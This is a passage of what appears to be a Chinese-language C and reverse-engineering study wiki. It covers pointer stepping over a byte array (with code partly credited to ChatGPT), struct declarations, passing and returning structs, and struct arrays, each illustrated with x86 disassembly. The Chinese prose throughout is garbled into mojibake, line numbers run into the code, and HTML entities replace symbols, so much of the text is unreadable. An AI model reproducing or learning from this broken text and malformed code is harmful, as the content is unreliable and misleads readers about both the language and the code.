4ä¸ªå­—èŠ‚ã€‚æŒ‰ç…§æˆ‘ä»¬ä¸Šé¢çš„è¯´æ³•ï¼Œè¿­ä»£æ—¶åº”è¯¥å‰è¿›1ä¸ªå­—èŠ‚ï¼Œè€Œä¸æ˜¯4ä¸ªå­—èŠ‚ã€‚æ€ä¹ˆåšï¼Ÿ 123456789100x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,0x00,0x02,0x74,0x0F,0x41,0x00,0x06,0x08,0x00,0x00,0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00 ç­”æ¡ˆè¯»æ•°æ®æ—¶ç”¨intç±»å‹æŒ‡é’ˆï¼Œæ­¥è¿›æ—¶ç”¨charç±»å‹æŒ‡é’ˆã€‚æ•°æ®çš„èŒƒå›´æ˜¯[0-length-1]ï¼Œåœ¨è¿™ä¸ªä¾‹å­æ˜¯[0-99]ï¼Œintç±»å‹æœï¼Œæœ€åä¸€ä¸ªæ•°åº”æ˜¯96ã€‚å³length-1-3ï¼ˆæœ€åä¸€ä¸ªæ•°åœ¨èµ°3ä¸ªå­—èŠ‚å°±åˆ°æœ€åä¸€ä¸ªå­—èŠ‚ï¼‰ã€‚æˆ‘å†™çš„chatGPTç‰ˆ123456789101112131415161718192021222324252627282930313233#include &quot;stdafx.h&quot;char data[100] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00&#125;;int main()&#123; int *int_p = (int *)data; char *p = data; for (int i = 0; i &lt; 100 - 3; i++) &#123; //printf(&quot;%d: %p %d &quot;,i, int_p,*int_p); if ((*int_p) == 100) &#123; printf(&quot;%d: %p %d &quot;,i, int_p,*int_p); &#125; ++p; int_p = (int *)p; &#125; return 0;&#125;chatgptç”¨foré‡Œçš„è®¡æ•°å™¨iæ¥è¿­ä»£ã€‚å¦å¤–ï¼Œä½¿ç”¨äº†void *æ¥æ‰“å°åœ°å€ï¼Œå› ä¸º%pæ ¼å¼åŒ–å­—ç¬¦ä¸²æœŸæœ›ä¸€ä¸ªvoid *ç±»å‹çš„å‚æ•°ã€‚è¿™æ ·å¯ä»¥é¿å…ç¼–è¯‘å™¨è­¦å‘Š1234567891011121314151617181920212223242526272829#include &quot;stdafx.h&quot;int main()&#123; unsigned char data[100] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00 &#125;; for (int i = 0; i &lt; 100 - 3; ++i) &#123; int value = *(int*)&amp;data[i]; // Cast the address to an int pointer and dereference it if (value == 100) &#123; printf(&quot;Address: %p Value: %d &quot;, (void *)&amp;data[i], value); &#125; &#125; return 0;&#125;ä¾æ¬¡æ‰“å°ï¼Œæ£€éªŒï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596970: 00424A30 50462976 1: 00424A31 67305985 2: 00424A32 84148994 3: 00424A33 100992003 4: 00424A34 117835012 5: 00424A35 117900805 6: 00424A36 151455494 7: 00424A37 591623 8: 00424A38 536873223 9: 00424A39 270532617 10: 00424A3A 51388416 11: 00424A3B 50532384 12: 00424A3C 201523984 13: 00424A3D 787203 14: 00424A3E 3075 15: 00424A3F 1140850700 16: 00424A40 4456448 17: 00424A41 17408 18: 00424A42 855638084 19: 00424A43 3342336 20: 00424A44 1191195392 21: 00424A45 205979699 22: 00424A46 235685632 23: 00424A47 920647 24: 00424A48 218107404 25: 00424A49 851982 26: 00424A4A 285216000 27: 00424A4B 1114125 28: 00424A4C 4352 29: 00424A4D 17 30: 00424A4E 33554432 31: 00424A4F 1677852672 32: 00424A50 6554112 33: 00424A51 25602 34: 00424A52 100 35: 00424A53 -1442840576 36: 00424A54 11141120 37: 00424A55 43520 38: 00424A56 170 39: 00424A57 1677721600 40: 00424A58 274989056 41: 00424A59 1074176 42: 00424A5A 4196 43: 00424A5B 16 44: 00424A5C 0 45: 00424A5D 0 46: 00424A5E 0 47: 00424A5F 0 48: 00424A60 0 49: 00424A61 33554432 50: 00424A62 131072 51: 00424A63 1946157568 52: 00424A64 259260418 53: 00424A65 1091531776 54: 00424A66 4263796 55: 00424A67 16655 56: 00424A68 65 57: 00424A69 16777216 58: 00424A6A 65536 59: 00424A6B 256 60: 00424A6C 1 61: 00424A6D 83886080 62: 00424A6E 327680 63: 00424A6F 1280 64: 00424A70 5 65: 00424A71 167772160 66: 00424A72 655360 67: 00424A73 2560 68: 00424A74 33554442 69: 00424A75 1946288128 70: 00424A76 259260928 71: 00424A77 1091531778 72: 00424A78 4263796 73: 00424A79 100679951 74: 00424A7A 134611009 75: 00424A7B 525824 76: 00424A7C 2054 77: 00424A7D 8 78: 00424A7E 0 79: 00424A7F 0 80: 00424A80 1677721600 81: 00424A81 6553600 82: 00424A82 251683840 83: 00424A83 983140 84: 00424A84 3840 85: 00424A85 218103823 86: 00424A86 851968 87: 00424A87 3328 88: 00424A88 13 89: 00424A89 587202560 90: 00424A8A 2293760 91: 00424A8B 8960 92: 00424A8C 1677721635 93: 00424A8D 6553600 94: 00424A8E 25600 95: 00424A8F 1677721700 96: 00424A90 6553600"},{"title":"ç»“æ„ä½“","path":"/wiki/C/ç»“æ„ä½“.html","content":"å‰è¨€ å½“éœ€è¦ä¸€ä¸ªå®¹å™¨èƒ½å¤Ÿå­˜å‚¨1ä¸ªå­—èŠ‚ï¼Œä½ ä¼šæ€ä¹ˆåšï¼Ÿä½¿ç”¨charã€‚ å½“éœ€è¦ä¸€ä¸ªå®¹å™¨èƒ½å¤Ÿå­˜å‚¨4ä¸ªå­—èŠ‚ï¼Œä½ ä¼šæ€ä¹ˆåšï¼Ÿ ä½¿ç”¨intã€‚ å½“éœ€è¦ä¸€ä¸ªå®¹å™¨èƒ½å¤Ÿå­˜å‚¨100ä¸ª2ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œä½ ä¼šæ€ä¹ˆåšï¼Ÿ ä½¿ç”¨short arr[100]ã€‚ å½“éœ€è¦ä¸€ä¸ªå®¹å™¨èƒ½å¤Ÿå­˜å‚¨5ä¸ªæ•°æ®ï¼Œè¿™5ä¸ªæ•°æ®ä¸­æœ‰1å­—èŠ‚çš„ï¼Œ2å­—èŠ‚çš„æœ‰10å­—èŠ‚çš„â€¦ä½ ä¼šæ€ä¹ˆåšï¼Ÿ ï¼ˆæ•°ç»„åªèƒ½æ˜¯ç›¸åŒç±»å‹çš„ï¼‰ ç­”æ¡ˆï¼šç»“æ„ä½“ å®šä¹‰ char/int/æ•°ç»„ç­‰ç±»å‹æ˜¯ç¼–è¯‘å™¨å·²çŸ¥ç±»å‹ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºå†…ç½®ç±»å‹ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ç»“æ„ä½“ï¼Œå°†ä¸åŒç±»å‹çš„æ•°æ®ç»„åˆæˆä¸€ä¸ªæ–°çš„æ•°æ®ç±»å‹ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨è¿™æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„ç±»å‹ã€‚ ç»“æ„å£°æ˜ï¼ˆstructure declarationï¼‰å¦‚ä¸‹ï¼š 123456struct ç±»å‹å&#123; // å¯ä»¥å®šä¹‰å¤šç§ç±»å‹ int a; char b; short c;&#125;; å¦‚ä¸Šä»£ç æ‰€ç¤ºæˆ‘ä»¬ä»…ä»…æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œæˆ‘ä»¬å®šä¹‰çš„ç±»å‹æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œè¿™æ®µä»£ç æœ¬èº«å¹¶ä¸ä¼šå ç”¨å†…å­˜ç©ºé—´ã€‚ ç»“æ„ä½“å£°æ˜çš„ä½ç½®å’Œå˜é‡ä¸€æ ·ï¼Œéƒ½å­˜åœ¨å…¨å±€å’Œå±€éƒ¨çš„å±æ€§ã€‚ ç»“æ„ä½“åœ¨å®šä¹‰çš„æ—¶å€™ï¼Œé™¤äº†æœ¬èº«ä»¥å¤–å¯ä»¥ä½¿ç”¨ä»»ä½•ç±»å‹ã€‚ï¼ˆè¦ä¸å°±æ­»å¾ªç¯äº†ï¼Œç¼–è¯‘å™¨ä¸çŸ¥é“æ€ä¹ˆä¸ºè¿™ä¸ªç»“æ„ä½“åˆ†é…ç©ºé—´ï¼‰ æ”¯æŒçš„å†™æ³•12345678910111213struct st1&#123; char a; short b; int arr[10];&#125;;struct st2&#123; char a; short b; st1 s;&#125;; é”™è¯¯çš„å†™æ³•123456struct st1&#123; char a; short b; st1 s; //æˆå‘˜åˆåŒ…å«äº†è‡ªèº«ï¼Œé€»è¾‘ä¸Šä¼šæ­»å¾ªç¯&#125;; ç»“æ„ä½“å˜é‡çš„è¯»å†™ ç”¨ç»“æ„æˆå‘˜è¿ç®—ç¬¦. 1234567891011121314151617struct stPoint&#123; int x; int y;&#125;;stPoint point = &#123;10,20&#125;;int x;int y;// readx = point.x;y = point.y;// writepoint.x = 100;point.y = 200; ç»“æ„å£°æ˜æ—¶ä¾¿å®šä¹‰äº†å˜é‡ 1234567891011121314struct stPoint&#123; int x; int y;&#125;point1,point2,point3;point1.x = 1;point1.y = 2;point2.x = 3;point2.y = 4;point3.x = 5;point3.y = 6; åæ±‡ç¼– å¦‚æœæˆ‘å®šä¹‰ä¸€ä¸ªç»“æ„ä½“ï¼Œé‡Œé¢éƒ½æ˜¯ç­‰å®½çš„æˆå‘˜ï¼Œé‚£å®ƒçš„åæ±‡ç¼–ä»£ç å’Œæ•°ç»„ä¸€æ ·ï¼Œé€†å‘æ—¶å¯ä»¥è¿˜åŸæˆæ•°ç»„ã€‚ é€†å‘æ˜¯åŠŸèƒ½è¿˜åŸï¼Œè€Œä¸æ˜¯ä»£ç è¿˜åŸï¼Œä»£ç è¿˜åŸä¼šç´¯æ­»äººçš„ ç»“æ„ä½“æ•°ç»„å˜é‡1234567891011121314151617181920212223#include &quot;stdafx.h&quot;struct st&#123; int a; int b; int c;&#125;;void Function()&#123; st x; x.a=10; x.b=20; x.c=30;&#125;int main()&#123; Function(); return 0;&#125; ç¼–è¯‘å™¨åˆ†é…çš„ç©ºé—´æ˜¯4C-40h=0xCh 123456789101112#include &quot;stdafx.h&quot;void Function()&#123; int arr[3] = &#123;10, 20, 30&#125;;&#125;int main()&#123; Function(); return 0;&#125; ç¼–è¯‘å™¨åˆ†é…çš„ç©ºé—´æ˜¯4C-40h=0xCh 1234567891011121314#include &quot;stdafx.h&quot;void Function()&#123; int a=10; int b=20; int c=30;&#125;int main()&#123; Function(); return 0;&#125; ç¼–è¯‘å™¨åˆ†é…çš„ç©ºé—´æ˜¯4C-40h=0xCh ç»“æ„ä½“ä½œä¸ºå‚æ•° è¿™å—ä¸ç”¨ä½œæ€»ç»“ï¼Œçœ‹æ‡‚ç»“æ„ä½“ç±»å‹æ˜¯æ€ä¹ˆä¼ çš„å‚æ•°å°±è¡Œã€‚ ä¾‹1 123456789101112131415161718192021222324#include &quot;stdafx.h&quot;struct st&#123; char a; short b; int c;&#125;;void Function(st s)&#123;&#125;int main()&#123; st s; s.a=1; s.b=2; s.c=3; Function(s); return 0;&#125; charå’Œshortç±»å‹ä¸€èµ·ä»¥4å­—èŠ‚è¿›è¡Œå‚æ•°ä¼ é€’äº†ã€‚ ä¾‹2 12345678910111213141516171819202122232425262728293031#include &quot;stdafx.h&quot;struct st&#123; int a; int b; int c; int d; int e; int f;&#125;;void Function(st s)&#123;&#125;int main()&#123; st s; s.a=1; s.b=2; s.c=3; s.c=4; s.c=5; s.c=6; Function(s); return 0;&#125; ä¸Šé¢å¯¹å±€éƒ¨å˜é‡èµ‹å€¼çš„æ±‡ç¼–ä»£ç å¥½åƒbugäº†ï¼Œæ²¡å…³ç³»ï¼Œä¸æ˜¯é‡ç‚¹ã€‚ åœ¨æˆ‘ä»¬ä¹‹å‰çš„å­¦ä¹ ï¼Œå‡½æ•°å‚æ•°ä¼ é€’æœ‰ä¸¤ç§æ–¹å¼ï¼Œå †æ ˆå’Œå¯„å­˜å™¨ã€‚å½“å‡½æ•°å‚æ•°è¾ƒå°‘æ—¶ï¼Œç¼–è¯‘å™¨ç”Ÿæˆpush å‚æ•°çš„æŒ‡ä»¤ï¼Œå°†å‚æ•°é€ä¸ªå‹å…¥å †æ ˆã€‚ç°åœ¨è¿™ä¸ªä¾‹å­ä¼ çš„å‚æ•°æ¯”è¾ƒå¤šï¼Œç¼–è¯‘å™¨è§‰å¾—æ¯”è¾ƒéº»çƒ¦ï¼Œå°±ç”¨é‡å¤æ‰§è¡Œmovsdçš„æ–¹å¼è¿›è¡Œä¼ å‚ã€‚æ•ˆæœå’Œpush å‚æ•°ï¼ˆå‹å…¥å‚æ•°ï¼Œespå‡å»ç›¸åº”çš„å€¼ä¸€æ ·ï¼‰ã€‚ 12345SUB ESP,18MOV ECX,6LEA ESI,DWORD PTR SS:[EBP-18]MOV EDI,ESPREP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI] å°ç»“ï¼šå½“ä¼ é€’çš„å‚æ•°ç‰¹åˆ«å¤šæ—¶ï¼Œè®¡ç®—æœºé‡‡ç”¨çš„æ˜¯å°†ä¸€å¤§å—å†…å­˜å¤åˆ¶åˆ°å¦ä¸€å—å†…å­˜çš„æ–¹å¼ã€‚ ç»“æ„ä½“ä½œä¸ºè¿”å›å€¼ 1234567891011121314151617181920212223242526272829#include &quot;stdafx.h&quot;struct st&#123; char a; short b; int c; int d; int e;&#125;;st Function()&#123; st s; s.a = 1; s.b = 2; s.c = 3; s.d = 4; s.e = 5; return s;&#125;;int main(int argc, char *argv[])&#123; st s = Function(); return 0;&#125; mainå‡½æ•°çš„åæ±‡ç¼–Functionå‡½æ•°çš„åæ±‡ç¼–1234567891011121314151617181920212223242526272829303132333435363738394041424344454627: int main(int argc, char *argv[])28: &#123;00401050 push ebp00401051 mov ebp,esp00401053 sub esp,70h00401056 push ebx00401057 push esi00401058 push edi00401059 lea edi,[ebp-70h]0040105C mov ecx,1Ch00401061 mov eax,0CCCCCCCCh00401066 rep stos dword ptr [edi]29: st s = Function();00401068 lea eax,[ebp-30h]0040106B push eax0040106C call @ILT+10(Function) (0040100f)00401071 add esp,400401074 mov ecx,dword ptr [eax]00401076 mov dword ptr [ebp-20h],ecx00401079 mov edx,dword ptr [eax+4]0040107C mov dword ptr [ebp-1Ch],edx0040107F mov ecx,dword ptr [eax+8]00401082 mov dword ptr [ebp-18h],ecx00401085 mov edx,dword ptr [eax+0Ch]00401088 mov dword ptr [ebp-14h],edx0040108B mov eax,dword ptr [ebp-20h]0040108E mov dword ptr [ebp-10h],eax00401091 mov ecx,dword ptr [ebp-1Ch]00401094 mov dword ptr [ebp-0Ch],ecx00401097 mov edx,dword ptr [ebp-18h]0040109A mov dword ptr [ebp-8],edx0040109D mov eax,dword ptr [ebp-14h]004010A0 mov dword ptr [ebp-4],eax30:31: return 0;004010A3 xor eax,eax32: &#125;004010A5 pop edi004010A6 pop esi004010A7 pop ebx004010A8 add esp,70h004010AB cmp ebp,esp004010AD call __chkesp (004010e0)004010B2 mov esp,ebp004010B4 pop ebp004010B5 ret12345678910111213141516171819202122232425262728293031323334353637383940414215: st Function()16: &#123;0040D4D0 push ebp0040D4D1 mov ebp,esp0040D4D3 sub esp,50h0040D4D6 push ebx0040D4D7 push esi0040D4D8 push edi0040D4D9 lea edi,[ebp-50h]0040D4DC mov ecx,14h0040D4E1 mov eax,0CCCCCCCCh0040D4E6 rep stos dword ptr [edi]17: st s;18: s.a = 1;0040D4E8 mov byte ptr [ebp-10h],119: s.b = 2;0040D4EC mov word ptr [ebp-0Eh],offset Function+20h (0040d4f0)20: s.c = 3;0040D4F2 mov dword ptr [ebp-0Ch],321: s.d = 4;0040D4F9 mov dword ptr [ebp-8],422: s.e = 5;0040D500 mov dword ptr [ebp-4],523:24: return s;0040D507 mov eax,dword ptr [ebp+8]0040D50A mov ecx,dword ptr [ebp-10h]0040D50D mov dword ptr [eax],ecx0040D50F mov edx,dword ptr [ebp-0Ch]0040D512 mov dword ptr [eax+4],edx0040D515 mov ecx,dword ptr [ebp-8]0040D518 mov dword ptr [eax+8],ecx0040D51B mov edx,dword ptr [ebp-4]0040D51E mov dword ptr [eax+0Ch],edx0040D521 mov eax,dword ptr [ebp+8]25: &#125;;0040D524 pop edi0040D525 pop esi0040D526 pop ebx0040D527 mov esp,ebp0040D529 pop ebp0040D52A ret æˆ‘ä»¬ä¸»è¦åˆ†æmainå‡½æ•°è°ƒç”¨Functionå‡½æ•°å‰å’Œè°ƒç”¨åçš„åæ±‡ç¼–ï¼Œä»¥åŠFunctionå‡½æ•°ç»™å±€éƒ¨å˜é‡èµ‹å€¼åï¼Œæ˜¯æ€ä¹ˆå°†ç»“æ„ä½“å˜é‡è¿”å›çš„ mainå‡½æ•°è°ƒç”¨Functionå‡½æ•°å‰å’Œè°ƒç”¨åçš„åæ±‡ç¼–ä»£ç Functionå‡½æ•°å†…éƒ¨ï¼Œè¿”å›å‰çš„ä»£ç 12345678910111213141516171819202129: st s = Function();00401068 lea eax,[ebp-30h]0040106B push eax0040106C call @ILT+10(Function) (0040100f)00401071 add esp,400401074 mov ecx,dword ptr [eax]00401076 mov dword ptr [ebp-20h],ecx00401079 mov edx,dword ptr [eax+4]0040107C mov dword ptr [ebp-1Ch],edx0040107F mov ecx,dword ptr [eax+8]00401082 mov dword ptr [ebp-18h],ecx00401085 mov edx,dword ptr [eax+0Ch]00401088 mov dword ptr [ebp-14h],edx0040108B mov eax,dword ptr [ebp-20h]0040108E mov dword ptr [ebp-10h],eax00401091 mov ecx,dword ptr [ebp-1Ch]00401094 mov dword ptr [ebp-0Ch],ecx00401097 mov edx,dword ptr [ebp-18h]0040109A mov dword ptr [ebp-8],edx0040109D mov eax,dword ptr [ebp-14h]004010A0 mov dword ptr [ebp-4],eax123456789101124: return s;0040D507 mov eax,dword ptr [ebp+8]0040D50A mov ecx,dword ptr [ebp-10h]0040D50D mov dword ptr [eax],ecx0040D50F mov edx,dword ptr [ebp-0Ch]0040D512 mov dword ptr [eax+4],edx0040D515 mov ecx,dword ptr [ebp-8]0040D518 mov dword ptr [eax+8],ecx0040D51B mov edx,dword ptr [ebp-4]0040D51E mov dword ptr [eax+0Ch],edx0040D521 mov eax,dword ptr [ebp+8] è°ƒç”¨Functionå‡½æ•°å‰å°†[ebp-30h]çš„åœ°å€å‹å…¥å †æ ˆ æˆ‘ä»¬å®šä¹‰çš„Functionæ˜¯æ— å‚çš„ï¼Œä½†æ˜¯ç¼–è¯‘å™¨ç”Ÿæˆäº†å¦‚ä¸‹ä»£ç ï¼Œå°†[ebp-30h]çš„åœ°å€å‹å…¥å †æ ˆï¼Œéšåæ‰æ‰§è¡Œcallè°ƒç”¨å‡½æ•°ã€‚ 123400401068 lea eax,[ebp-30h]0040106B push eax0040106C call @ILT+10(Function) (0040100f)00401071 add esp,4 ebp-30æ˜¯å“ªé‡Œï¼Ÿå°±æ˜¯mainå‡½æ•°ç¼“å†²åŒºçš„ä¸€ä¸ªåœ°å€ï¼Œç›®å‰[ebp-30]æ˜¯0xCCCCCCCã€‚å‹è¿™ä¸ªå‚æ•°å¹²ä»€ä¹ˆï¼Ÿ ç­”ï¼šå¤–å±‚å‡½æ•°mainå‡½æ•°ç”¨è¿™å—å†…å­˜æ¥å­˜Functionå‡½æ•°è¿”å›çš„ä¸€å¤§å †å€¼ã€‚ å› ä¸ºFuntionå‡½æ•°è¦è¿”å›ä¸€ä¸ªç»“æ„ä½“å˜é‡ï¼Œå çš„ç©ºé—´æ¯”è¾ƒå¤šã€‚ç¼–è¯‘æ—¶å°±çŸ¥é“äº†mainå‡½æ•°è¦æ¥æ”¶ä»Functionå‡½æ•°è¿”å›æ¥çš„æ¯”è¾ƒå¤šçš„æ•°ï¼Œæ‰€ä»¥ç¼–è¯‘å™¨ä¼šå¢åŠ mainå‡½æ•°çš„ç¼“å†²åŒºå¤§å°ï¼Œå¤šå‡ºæ¥çš„ç©ºé—´ç”¨æ¥æ¥æ”¶Funtionå‡½æ•°è¿”å‡ºæ¥çš„ä¸€å¤§å †å€¼ã€‚ Functionå‡½æ•°è¿”å›å‰ åœ¨Funtionå‡½æ•°ä¸­å¯¹å±€éƒ¨å˜é‡èµ‹å€¼ã€‚ 1234567891018: s.a = 1;0040D4E8 mov byte ptr [ebp-10h],119: s.b = 2;0040D4EC mov word ptr [ebp-0Eh],offset Function+20h (0040d4f0)20: s.c = 3;0040D4F2 mov dword ptr [ebp-0Ch],321: s.d = 4;0040D4F9 mov dword ptr [ebp-8],422: s.e = 5;0040D500 mov dword ptr [ebp-4],5 éšåå–å‡º[ebp+8]å–å‡ºæ”¾å…¥eaxã€‚[ebp+8]å°±æ˜¯ä¸Šä¸€æ­¥å‹å…¥å †æ ˆçš„å‚æ•°ï¼ˆmainå‡½æ•°æ ˆå¸§çš„ebp-30ï¼‰ã€‚ç„¶åå°†å±€éƒ¨å˜é‡çš„å€¼é€ä¸ªç§»åŠ¨åˆ°mainå‡½æ•°æ ˆå¸§çš„ebp-30â€”ebp-30+0xCä½ç½®ã€‚ 12345678910110040D50A mov ecx,dword ptr [ebp-10h]0040D50D mov dword ptr [eax],ecx0040D50F mov edx,dword ptr [ebp-0Ch]0040D512 mov dword ptr [eax+4],edx0040D515 mov ecx,dword ptr [ebp-8]0040D518 mov dword ptr [eax+8],ecx0040D51B mov edx,dword ptr [ebp-4]0040D51E mov dword ptr [eax+0Ch],edx åœ¨è¿”å›å‰ï¼Œé‡æ–°å°†[ebp+8]çš„å€¼èµ‹ç»™eaxã€‚ 10040D521 mov eax,dword ptr [ebp+8] éšåï¼Œè°ƒç”¨ç»“æŸï¼ŒFunctionå‡½æ•°çš„æ ˆå¸§å…³é—­ï¼Œå›åˆ°mainå‡½æ•°çš„æ ˆå¸§ã€‚ mainå‡½æ•°ä¸­å°†ebp-30â€”ebp-30+0xCä½ç½®çš„å€¼ç§»åŠ¨åˆ°ebp-20â€”ebp-14ã€‚ 123456789101100401074 mov ecx,dword ptr [eax]00401076 mov dword ptr [ebp-20h],ecx00401079 mov edx,dword ptr [eax+4]0040107C mov dword ptr [ebp-1Ch],edx0040107F mov ecx,dword ptr [eax+8]00401082 mov dword ptr [ebp-18h],ecx00401085 mov edx,dword ptr [eax+0Ch]00401088 mov dword ptr [ebp-14h],edx å°†ebp-20â€”ebp-14ä½ç½®çš„å€¼èµ‹å€¼ç»™å±€éƒ¨å˜é‡sçš„å„ä¸ªæˆå‘˜ã€‚ 12345678910110040108B mov eax,dword ptr [ebp-20h]0040108E mov dword ptr [ebp-10h],eax00401091 mov ecx,dword ptr [ebp-1Ch]00401094 mov dword ptr [ebp-0Ch],ecx00401097 mov edx,dword ptr [ebp-18h]0040109A mov dword ptr [ebp-8],edx0040109D mov eax,dword ptr [ebp-14h]004010A0 mov dword ptr [ebp-4],eax ç»¼ä¸Šï¼Œè°ƒç”¨Functionå‰ï¼Œä¼šå°†mainå‡½æ•°ç¼“å†²åŒºä¸­çš„æŸä¸ªåœ°å€å‹å…¥å †æ ˆï¼Œå¦‚æ­¤ä¸€æ¥ï¼ŒFunctionå‡½æ•°å†…éƒ¨å°±å¯ä»¥é€šè¿‡è¿™ä¸ªåœ°å€è®¿é—®åˆ°mainå‡½æ•°ä¸­çš„ç¼“å†²åŒºï¼ˆä¸Šè¿°æ­¥éª¤1ï¼‰ã€‚Functionç»™è‡ªå·±çš„å±€éƒ¨å˜é‡èµ‹å€¼åï¼Œå°†å±€éƒ¨å˜é‡çš„å€¼é€šè¿‡å…ˆå‰å‹å…¥çš„å‚æ•°ï¼Œå¤åˆ¶åˆ°mainå‡½æ•°çš„ç¼“å†²åŒºAä½ç½®ï¼ŒéšåFunctionç»“æŸè°ƒç”¨ï¼ˆä¸Šè¿°æ­¥éª¤2ï¼‰ã€‚åœ¨mainå‡½æ•°ä¸­ï¼Œå°†Functionä¸­å¤åˆ¶åˆ°Aä½ç½®çš„å€¼ï¼Œå†å¤åˆ¶ä¸€ä»½åˆ°ç¼“å†²åŒºä¸­çš„å…¶ä»–ä½ç½®Bï¼ˆä¸Šè¿°æ­¥éª¤3ï¼‰ã€‚æœ€åï¼Œå°†ä½ç½®Bçš„å€¼å¤åˆ¶ç»™ç»“æ„ä½“å˜é‡ï¼ˆä¸Šè¿°æ­¥éª¤4ï¼‰ã€‚ è¿™ä¸ªæ­¥éª¤3åˆ†ææ—¶æ„Ÿè§‰æœ‰äº›å¤šä½™ï¼Œä½†ç¼–è¯‘å™¨ç¡®å®æ˜¯è¿™æ ·ç”Ÿæˆçš„ã€‚ å…³é”®éƒ¨åˆ†çš„å †æ ˆå›¾ç¤ºæ„å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ æƒ³èµ·äº†åœ¨cppä¸­ï¼Œæ‹·è´æ„é€ å‡½æ•°ï¼Œå¤åˆ¶å¯¹è±¡æ—¶ï¼Œè¯´çš„æ— åå¯¹è±¡ï¼Œå°±æ˜¯æŒ‡ä½ç½®Aè¿™ç§æƒ…å†µå§ã€‚ å¦‚æœåœ¨Functionç›´æ¥ç»™mainä¸­å±€éƒ¨å˜é‡èµ‹å€¼ï¼Œä¼ çš„å°±æ˜¯æŒ‡é’ˆã€‚ ä¸éœ€è¦æ€»ç»“å¯¹åº”çš„åæ±‡ç¼–ä»£ç ã€‚ å¯ä»¥æ€»ç»“çš„æ˜¯ï¼š ç»“æ„ä½“å˜é‡å½“å‚æ•°æˆ–è¿”å›å€¼ä¼ é€’æ—¶ï¼Œä¼šå‘ç”Ÿå¤§é‡çš„å†…å­˜å¤åˆ¶ï¼Œéå¸¸å ç”¨å†…å­˜ç©ºé—´ï¼Œåœ¨æ±‡ç¼–å±‚é¢æ˜¯ï¼Œéå¸¸æ¶ˆè€—å†…å­˜"},{"title":"ç»“æ„ä½“æ•°ç»„","path":"/wiki/C/ç»“æ„ä½“æ•°ç»„.html","content":"ç»“æ„ä½“æ•°ç»„ ç»“æ„ä½“æ˜¯ç§è‡ªå®šä¹‰ç±»å‹ï¼Œå’Œintã€charç­‰å†…ç½®ç±»å‹ä½¿ç”¨ä¸Šä¸€æ ·ï¼Œä¹Ÿæœ‰æ•°ç»„ã€‚ 12345678910111213ç±»å‹ å˜é‡å[å¸¸é‡è¡¨è¾¾å¼]; // å®šä¹‰ç»“æ„ä½“ç±»å‹struct stStudent&#123; int Age; int Level;&#125;; // å®šä¹‰ç»“æ„ä½“å˜é‡struct stStudent st;// å®šä¹‰ç»“æ„ä½“æ•°ç»„struct stStudent arr[10]; æˆ–è€… stStudent arr[10]; åˆå§‹åŒ– 123456789struct stStudent &#123; int Age; int Level;&#125;; stStudent arr[5] = &#123;&#123;0,0&#125;, &#123;1,1&#125;, &#123;2,2&#125;, &#123;3,3&#125;, &#123;4,4&#125;&#125;;//æˆ–arr[0].Age = 100;arr[0].Level = 100; ç»“æ„ä½“æˆå‘˜ä½¿ç”¨ ç»“æ„ä½“æ•°ç»„å[ä¸‹æ ‡].æˆå‘˜å 12arr[0].Age = 10;int age = arr[0].Age; å†…å­˜ç»“æ„ 1234567struct stStudent&#123; int Age; char Name[0x20];&#125;;struct stStudent arr[3] = &#123;&#123;0,&quot;å¼ 